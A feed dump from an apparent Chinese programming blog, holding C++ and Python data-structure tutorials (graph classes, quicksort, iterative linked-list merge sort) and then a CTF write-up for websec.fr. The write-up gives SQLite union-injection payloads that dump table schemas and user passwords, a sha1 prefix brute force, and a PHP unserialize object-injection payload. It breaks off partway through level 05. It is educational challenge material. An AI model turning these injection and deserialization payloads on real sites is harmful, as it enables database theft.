&#125;<br>        <span class="hljs-comment">// 在无向图中，邻接矩阵关于主对角线对称，即满足 (i, j) == (j, i)</span><br>        adjMat[i][j] = <span class="hljs-number">1</span>;<br>        adjMat[j][i] = <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* 删除边 */</span><br>    <span class="hljs-comment">// 参数 i, j 对应 vertices 元素索引</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">removeEdge</span><span class="hljs-params">(<span class="hljs-type">int</span> i, <span class="hljs-type">int</span> j)</span> </span>&#123;<br>        <span class="hljs-comment">// 索引越界与相等处理</span><br>        <span class="hljs-keyword">if</span> (i &lt; <span class="hljs-number">0</span> || j &lt; <span class="hljs-number">0</span> || i &gt;= <span class="hljs-built_in">size</span>() || j &gt;= <span class="hljs-built_in">size</span>() || i == j) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-built_in">out_of_range</span>(<span class="hljs-string">&quot;顶点不存在&quot;</span>);<br>        &#125;<br>        adjMat[i][j] = <span class="hljs-number">0</span>;<br>        adjMat[j][i] = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* 打印邻接矩阵 */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print</span><span class="hljs-params">()</span> </span>&#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;顶点列表 = &quot;</span>;<br>        <span class="hljs-built_in">printVector</span>(vertices);<br>        cout &lt;&lt; <span class="hljs-string">&quot;邻接矩阵 =&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-built_in">printVectorMatrix</span>(adjMat);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h5 id="邻接表实现"><a href="#邻接表实现" class="headerlink" title="邻接表实现"></a>邻接表实现</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 基于邻接表实现的无向图类 */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">GraphAdjList</span> &#123;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">// 邻接表，key：顶点，value：该顶点的所有邻接顶点</span><br>    unordered_map&lt;Vertex *, vector&lt;Vertex *&gt;&gt; adjList;<br><br>    <span class="hljs-comment">/* 在 vector 中删除指定节点 */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">remove</span><span class="hljs-params">(vector&lt;Vertex *&gt; &amp;vec, Vertex *vet)</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; vec.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            <span class="hljs-keyword">if</span> (vec[i] == vet) &#123;<br>                vec.<span class="hljs-built_in">erase</span>(vec.<span class="hljs-built_in">begin</span>() + i);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* 构造方法 */</span><br>    <span class="hljs-built_in">GraphAdjList</span>(<span class="hljs-type">const</span> vector&lt;vector&lt;Vertex *&gt;&gt; &amp;edges) &#123;<br>        <span class="hljs-comment">// 添加所有顶点和边</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> vector&lt;Vertex *&gt; &amp;edge : edges) &#123;<br>            <span class="hljs-built_in">addVertex</span>(edge[<span class="hljs-number">0</span>]);<br>            <span class="hljs-built_in">addVertex</span>(edge[<span class="hljs-number">1</span>]);<br>            <span class="hljs-built_in">addEdge</span>(edge[<span class="hljs-number">0</span>], edge[<span class="hljs-number">1</span>]);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* 获取顶点数量 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">size</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> adjList.<span class="hljs-built_in">size</span>();<br>    &#125;<br><br>    <span class="hljs-comment">/* 添加边 */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">addEdge</span><span class="hljs-params">(Vertex *vet1, Vertex *vet2)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (!adjList.<span class="hljs-built_in">count</span>(vet1) || !adjList.<span class="hljs-built_in">count</span>(vet2) || vet1 == vet2)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-built_in">invalid_argument</span>(<span class="hljs-string">&quot;不存在顶点&quot;</span>);<br>        <span class="hljs-comment">// 添加边 vet1 - vet2</span><br>        adjList[vet1].<span class="hljs-built_in">push_back</span>(vet2);<br>        adjList[vet2].<span class="hljs-built_in">push_back</span>(vet1);<br>    &#125;<br><br>    <span class="hljs-comment">/* 删除边 */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">removeEdge</span><span class="hljs-params">(Vertex *vet1, Vertex *vet2)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (!adjList.<span class="hljs-built_in">count</span>(vet1) || !adjList.<span class="hljs-built_in">count</span>(vet2) || vet1 == vet2)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-built_in">invalid_argument</span>(<span class="hljs-string">&quot;不存在顶点&quot;</span>);<br>        <span class="hljs-comment">// 删除边 vet1 - vet2</span><br>        <span class="hljs-built_in">remove</span>(adjList[vet1], vet2);<br>        <span class="hljs-built_in">remove</span>(adjList[vet2], vet1);<br>    &#125;<br><br>    <span class="hljs-comment">/* 添加顶点 */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">addVertex</span><span class="hljs-params">(Vertex *vet)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (adjList.<span class="hljs-built_in">count</span>(vet))<br>            <span class="hljs-keyword">return</span>;<br>        <span class="hljs-comment">// 在邻接表中添加一个新链表</span><br>        adjList[vet] = <span class="hljs-built_in">vector</span>&lt;Vertex *&gt;();<br>    &#125;<br><br>    <span class="hljs-comment">/* 删除顶点 */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">removeVertex</span><span class="hljs-params">(Vertex *vet)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (!adjList.<span class="hljs-built_in">count</span>(vet))<br>            <span class="hljs-keyword">throw</span> <span class="hljs-built_in">invalid_argument</span>(<span class="hljs-string">&quot;不存在顶点&quot;</span>);<br>        <span class="hljs-comment">// 在邻接表中删除顶点 vet 对应的链表</span><br>        adjList.<span class="hljs-built_in">erase</span>(vet);<br>        <span class="hljs-comment">// 遍历其他顶点的链表，删除所有包含 vet 的边</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> &amp;adj : adjList) &#123;<br>            <span class="hljs-built_in">remove</span>(adj.second, vet);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* 打印邻接表 */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print</span><span class="hljs-params">()</span> </span>&#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;邻接表 =&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> &amp;adj : adjList) &#123;<br>            <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;key = adj.first;<br>            <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;vec = adj.second;<br>            cout &lt;&lt; key-&gt;val &lt;&lt; <span class="hljs-string">&quot;: &quot;</span>;<br>            <span class="hljs-built_in">printVector</span>(<span class="hljs-built_in">vetsToVals</span>(vec));<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="第11章-排序"><a href="#第11章-排序" class="headerlink" title="第11章 排序"></a>第11章 排序</h3><h4 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h4><h5 id="尾递归优化"><a href="#尾递归优化" class="headerlink" title="尾递归优化"></a>尾递归优化</h5><p><strong>在某些输入下，快速排序可能占用空间较多</strong>。以完全有序的输入数组为例，设递归中的子数组长度为$m$，每轮哨兵划分操作都将产生长度为$0$的左子数组和长度为$n-1$的右子数组，这意味着每一层递归调用减少的问题规模非常小（只减少一个元素），递归树的高度会达到$n-1$，此时需要占用$O(n)$大小的栈帧空间。</p><p>为了防止栈帧空间的累积，我们可以在每轮哨兵排序完成后，比较两个子数组的长度，<strong>仅对较短的子数组进行递归</strong>。由于较短子数组的长度不会超过$n&#x2F;2$，因此这种方法能确保递归深度不超过$logn$，从而将最差空间复杂度优化至$O(logn)$。代码如下所示：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 快速排序（尾递归优化） */</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">quickSort</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt; &amp;nums, <span class="hljs-type">int</span> left, <span class="hljs-type">int</span> right)</span> </span>&#123;<br>    <span class="hljs-comment">// 子数组长度为 1 时终止</span><br>    <span class="hljs-keyword">while</span> (left &lt; right) &#123;<br>        <span class="hljs-comment">// 哨兵划分操作</span><br>        <span class="hljs-type">int</span> pivot = <span class="hljs-built_in">partition</span>(nums, left, right);<br>        <span class="hljs-comment">// 对两个子数组中较短的那个执行快速排序</span><br>        <span class="hljs-keyword">if</span> (pivot - left &lt; right - pivot) &#123;<br>            <span class="hljs-built_in">quickSort</span>(nums, left, pivot - <span class="hljs-number">1</span>); <span class="hljs-comment">// 递归排序左子数组</span><br>            left = pivot + <span class="hljs-number">1</span>;                 <span class="hljs-comment">// 剩余未排序区间为 [pivot + 1, right]</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">quickSort</span>(nums, pivot + <span class="hljs-number">1</span>, right); <span class="hljs-comment">// 递归排序右子数组</span><br>            right = pivot - <span class="hljs-number">1</span>;                 <span class="hljs-comment">// 剩余未排序区间为 [left, pivot - 1]</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h4><h5 id="链表和数组排序的区别"><a href="#链表和数组排序的区别" class="headerlink" title="链表和数组排序的区别"></a>链表和数组排序的区别</h5><p>链表的排序用归并排序时可以使用迭代方法，而不一定要使用递归，主要是因为 <strong>归并排序在链表上的实现方式与数组不同，链表的结构更适合迭代合并</strong>。以下是具体原因：</p><hr><ol><li><strong>链表的分割可以通过遍历实现</strong></li></ol><p>在数组归并排序的递归版本中，我们通常使用索引的 <code>mid = (left + right) / 2</code> 来分割数组，并递归地处理两部分。但 <strong>链表不能用索引直接访问元素</strong>，只能从头遍历，因此 <strong>递归的拆分过程需要不断调用函数，可能导致深度过大</strong>。</p><p>在 <strong>迭代归并排序</strong> 中，我们可以 <strong>直接通过遍历链表来分割链表，而不需要递归</strong>：</p><ul><li>先计算链表的长度 <code>n</code>。</li><li>通过 <strong>从头开始每 <code>size</code> 个一组</strong>（<code>size</code> 从 1 逐步倍增）进行归并。</li><li>这样，每一轮归并的子链表长度逐渐增加，最终合并成完整的排序链表。</li></ul><ol start="2"><li><strong>链表的合并（Merge）可以使用迭代</strong></li></ol><p>归并排序的核心是<strong>合并两个有序链表</strong>，这个过程本身就可以 <strong>通过迭代完成</strong>：</p><ul><li>维护一个虚拟头节点 <code>dummy</code> 和一个 <code>tail</code> 指针。</li><li>依次遍历两个子链表，选择较小的节点接入 <code>tail</code> 后面。</li><li>继续推进，直到其中一个子链表为空，再连接剩余部分。</li></ul><p>这个 <strong>迭代合并的过程避免了递归的额外开销</strong>，而且 **时间复杂度仍然是 O(n)**。</p><ol start="3"><li><strong>迭代归并排序的过程</strong></li></ol><p>迭代版的归并排序一般采用 <strong>“自底向上”</strong> 方式进行：</p><ol><li>**统计链表长度 <code>n</code>**，然后进行 <code>size = 1</code>、<code>2</code>、<code>4</code>、<code>8</code> 等逐步归并。</li><li><strong>从头开始每 <code>size</code> 个分组</strong>，然后两两合并，形成更大的有序链表。</li><li>**逐步扩大 <code>size</code>**，直到 <code>size &gt;= n</code>，排序完成。</li></ol><p><strong>代码示例（迭代归并排序）</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ListNode</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, val=<span class="hljs-number">0</span>, <span class="hljs-built_in">next</span>=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-variable language_">self</span>.val = val<br>        <span class="hljs-variable language_">self</span>.<span class="hljs-built_in">next</span> = <span class="hljs-built_in">next</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mergeTwoLists</span>(<span class="hljs-params">l1, l2</span>):<br>    dummy = ListNode()<br>    tail = dummy<br>    <span class="hljs-keyword">while</span> l1 <span class="hljs-keyword">and</span> l2:<br>        <span class="hljs-keyword">if</span> l1.val &lt; l2.val:<br>            tail.<span class="hljs-built_in">next</span> = l1<br>            l1 = l1.<span class="hljs-built_in">next</span><br>        <span class="hljs-keyword">else</span>:<br>            tail.<span class="hljs-built_in">next</span> = l2<br>            l2 = l2.<span class="hljs-built_in">next</span><br>        tail = tail.<span class="hljs-built_in">next</span><br>    tail.<span class="hljs-built_in">next</span> = l1 <span class="hljs-keyword">if</span> l1 <span class="hljs-keyword">else</span> l2<br>    <span class="hljs-keyword">return</span> dummy.<span class="hljs-built_in">next</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sortList</span>(<span class="hljs-params">head</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> head <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> head.<span class="hljs-built_in">next</span>:<br>        <span class="hljs-keyword">return</span> head<br><br>    <span class="hljs-comment"># 计算链表长度</span><br>    length = <span class="hljs-number">0</span><br>    cur = head<br>    <span class="hljs-keyword">while</span> cur:<br>        length += <span class="hljs-number">1</span><br>        cur = cur.<span class="hljs-built_in">next</span><br><br>    dummy = ListNode(<span class="hljs-number">0</span>, head)<br>    size = <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">while</span> size &lt; length:<br>        prev, curr = dummy, dummy.<span class="hljs-built_in">next</span><br>        <span class="hljs-keyword">while</span> curr:<br>            <span class="hljs-comment"># 分割两个 `size` 长度的链表</span><br>            left = curr<br>            right = split(left, size)<br>            curr = split(right, size)<br>            <span class="hljs-comment"># 合并两个链表</span><br>            merged = mergeTwoLists(left, right)<br>            prev.<span class="hljs-built_in">next</span> = merged<br>            <span class="hljs-keyword">while</span> prev.<span class="hljs-built_in">next</span>:<br>                prev = prev.<span class="hljs-built_in">next</span><br>        size *= <span class="hljs-number">2</span><br><br>    <span class="hljs-keyword">return</span> dummy.<span class="hljs-built_in">next</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">split</span>(<span class="hljs-params">head, size</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;分割链表，使其最多有 size 个节点，并返回剩余部分&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> head:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(size - <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> head.<span class="hljs-built_in">next</span>:<br>            head = head.<span class="hljs-built_in">next</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span><br>    next_head = head.<span class="hljs-built_in">next</span><br>    head.<span class="hljs-built_in">next</span> = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">return</span> next_head<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Websec Writeup</title>
    <link href="/2024/07/18/Websec-Writeup/"/>
    <url>/2024/07/18/Websec-Writeup/</url>
    
    <content type="html"><![CDATA[<p>平台：<a href="https://websec.fr/">https://websec.fr/</a></p><h3 id="level-01"><a href="#level-01" class="headerlink" title="level 01"></a>level 01</h3><p>一道SQLite整型注入的题目，找到注入方法后可以查看表结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">-1 union select name,sql from sqlite_master<br></code></pre></td></tr></table></figure><p>再尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">-1 union select username,password from users where id=1<br></code></pre></td></tr></table></figure><p>即可获取到flag。</p><h3 id="level-02"><a href="#level-02" class="headerlink" title="level 02"></a>level 02</h3><p>前一题基础上加了一个双写绕过，不再赘述。</p><h3 id="level-03"><a href="#level-03" class="headerlink" title="level 03"></a>level 03</h3><p>这么长的hash值要是能碰撞出来就不是发writeup而是发paper了，所以处理函数一定有问题。首先<code>password_verify</code>函数用于验证密码是否和hash值匹配，这里不存在弱类型或是传递数组绕过，只能老老实实让<code>sha1($flag, fa1se)</code>和 <code>sha1($h2)</code>相等。这里会发现false故意拼写错了，就会被解析成true，在PHP里，<code>sha1(string, raw)</code>函数的语法为：</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>string</td><td>必须，规定需要进行运算的字符</td></tr><tr><td>raw</td><td>可选，默认为false，函数将返回一个 40 字符长的十六进制字符串，当设置为true时函数将返回一个 20 字节长的二进制字符串（原始二进制格式）</td></tr></tbody></table><p>同时，注意到提供给我们的hash的第二个字节为<code>0x00</code>，对应终止符<code>\0</code>，所以检验函数不会匹配00后面的内容。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">Here is the hash of your flag: <span class="hljs-number">7</span><span class="hljs-keyword">c</span><span class="hljs-number">00249</span>d<span class="hljs-number">409</span>a<span class="hljs-number">91</span>ab<span class="hljs-number">84e3</span>f<span class="hljs-number">421</span><span class="hljs-keyword">c</span><span class="hljs-number">193520</span>d<span class="hljs-number">9</span>fb<span class="hljs-number">3674</span>b<br></code></pre></td></tr></table></figure><p>因此，我们只需要找到一个字符的sha1值开头是<code>7c00</code>，即可通过验证。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    a = hashlib.sha1(<span class="hljs-built_in">str</span>(i).encode()).hexdigest()<br>    <span class="hljs-keyword">if</span> a.startswith(<span class="hljs-string">&quot;7c00&quot;</span>):<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br>    i += <span class="hljs-number">1</span><br><span class="hljs-comment">#104610</span><br></code></pre></td></tr></table></figure><h3 id="level-04"><a href="#level-04" class="headerlink" title="level 04"></a>level 04</h3><p>提供了源代码，关键代码在</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;leet_hax0r&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$sess_data</span> = <span class="hljs-title function_ invoke__">unserialize</span> (<span class="hljs-title function_ invoke__">base64_decode</span> (<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;leet_hax0r&#x27;</span>]));<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$sess_data</span>) &amp;&amp; <span class="hljs-variable">$sess_data</span>[<span class="hljs-string">&#x27;ip&#x27;</span>] != <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;CANT HACK US!!!&#x27;</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$e</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$cookie</span> = <span class="hljs-title function_ invoke__">base64_encode</span> (<span class="hljs-title function_ invoke__">serialize</span> (<span class="hljs-keyword">array</span> ( <span class="hljs-string">&#x27;ip&#x27;</span> =&gt; <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]))) ;<br>    <span class="hljs-title function_ invoke__">setcookie</span> (<span class="hljs-string">&#x27;leet_hax0r&#x27;</span>, <span class="hljs-variable">$cookie</span>, <span class="hljs-title function_ invoke__">time</span> () + (<span class="hljs-number">86400</span> * <span class="hljs-number">30</span>));<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SQL</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$query</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$conn</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;conn = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SQLite3</span> (<span class="hljs-string">&quot;database.db&quot;</span>, SQLITE3_OPEN_READONLY);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">SQL_query</span>(<span class="hljs-params"><span class="hljs-variable">$query</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;query = <span class="hljs-variable">$query</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;conn-&gt;<span class="hljs-title function_ invoke__">query</span> (<span class="hljs-variable">$this</span>-&gt;query);<br>    &#125;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>构造一个简单的反序列化，将base64编码结果填入到cookie中即可拿到flag。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SQL</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$query</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$conn</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;query = <span class="hljs-string">&quot;SELECT GROUP_CONCAT(password) as username from users;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;conn = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$inst</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">SQL</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$inst</span>)));<br></code></pre></td></tr></table></figure><h3 id="level-05"><a href="#level-05" class="headerlink" title="level 05"></a>level 05</h3><p>首先查看关键代码，程序获得我们的输入，并匹配黑名单，因此我们的命令不能使用引号、括号和反引号，用payload绕过即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$q</span> = <span class="hljs-title function_ invoke__">substr</span> (<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;q&#x27;</span>], <span class="hljs-number">0</span>, <span class="hljs-number">256</span>);<br><span class="hljs-variable">$blacklist</span> = <span class="hljs-title function_ invoke__">implode</span> ([<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span 